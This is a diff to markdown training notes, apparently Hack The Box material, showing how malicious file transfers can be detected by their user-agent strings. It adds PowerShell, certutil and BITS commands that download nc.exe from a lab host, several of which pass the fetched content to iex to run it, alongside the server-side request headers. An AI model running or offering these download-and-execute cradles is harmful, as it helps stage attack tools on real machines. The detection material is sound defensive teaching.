@@ -1527,52 +1527,102 @@ Malicious file transfers can also be detected by their user agents. The followin
 
 #### Invoke-WebRequest - Client
 
-![image](https://user-images.githubusercontent.com/24814781/198854360-168e860d-3a1c-47ea-9189-9ea3139c8de2.png)
+```
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+```
 
 #### Invoke-WebRequest - Server
 
-![image](https://user-images.githubusercontent.com/24814781/198854371-9eaf0796-5558-4c22-91b8-56cf0e258003.png)
+```
+GET /nc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
+```
 
 ### WinHttpRequest
 
 #### WinHttpRequest - Client
 
-![image](https://user-images.githubusercontent.com/24814781/198854375-52f55521-1c82-4284-b956-637b07af1511.png)
+```
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.ResponseText
+```
 
 #### WinHttpRequest - Server
 
-![image](https://user-images.githubusercontent.com/24814781/198854386-1bee6d46-a9a6-4be0-9d85-e91f1d7c5622.png)
+```
+GET /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+```
 
 ### Msxml2
 
 #### Msxml2 - Client
 
-![image](https://user-images.githubusercontent.com/24814781/198854395-9058eb70-171f-4b49-b178-94284c59f3b7.png)
+```
+PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.responseText
+```
 
 #### Msxml2 - Server
 
-![image](https://user-images.githubusercontent.com/24814781/198854404-a8abf95f-99b0-47d7-bc13-92f6c10afa36.png)
+```
+GET /nc.exe HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+```
 
 ### Certutil-D
 
 #### Certutil - Client
 
-![image](https://user-images.githubusercontent.com/24814781/198854407-bb082f92-d4b8-484d-a695-ce1dec9151f9.png)
+```
+PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+```
 
 #### Certutil - Server
 
-![image](https://user-images.githubusercontent.com/24814781/198854412-ec1f4b56-4b64-4a03-97dd-b9095f452dbb.png)
+```
+GET /nc.exe HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Accept: */*
+User-Agent: Microsoft-CryptoAPI/10.0
+```
 
 ### BITS
 
 #### BITS - Client
 
-![image](https://user-images.githubusercontent.com/24814781/198854418-06896352-b1e2-4788-82cb-80aeb27e39a0.png)
+```
+PS C:\htb> Import-Module bitstransfer;
+PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+PS C:\htb> $r=gc $env:temp\t;
+PS C:\htb> rm $env:temp\t; 
+PS C:\htb> iex $r
+```
 
 
 #### BITS - Server
 
-![image](https://user-images.githubusercontent.com/24814781/198854744-8cc1528f-940d-4a99-8aaf-542daf8aa264.png)
+```
+HEAD /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+Accept-Encoding: identity
+User-Agent: Microsoft BITS/7.8
+```
 
 
 This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress.
